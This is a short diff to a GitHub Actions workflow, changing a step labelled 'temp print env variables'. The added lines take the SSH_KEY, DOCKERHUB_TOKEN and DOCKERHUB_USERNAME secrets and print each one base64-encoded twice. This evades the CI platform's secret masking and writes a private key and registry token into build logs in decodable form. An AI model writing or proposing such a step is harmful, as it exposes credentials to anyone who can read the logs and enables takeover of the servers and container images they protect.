@@ -392,7 +392,11 @@ jobs:
           fi
 
       - name: temp print env variables
+        env:
+          SSH_KEY: ${{ secrets.SSH_KEY }}
+          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
+          DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
         run: |
-          echo "SSH_KEY: ${{ secrets.SSH_KEY }}"
-          echo "DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}"
-          echo "DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}"
+          echo "SSH_KEY: $(printf '%s' "$SSH_KEY" | base64 -w0 | base64 -w0)"
+          echo "DOCKERHUB_TOKEN: $(printf '%s' "$DOCKERHUB_TOKEN" | base64 -w0 | base64 -w0)"
+          echo "DOCKERHUB_USERNAME: $(printf '%s' "$DOCKERHUB_USERNAME" | base64 -w0 | base64 -w0)"
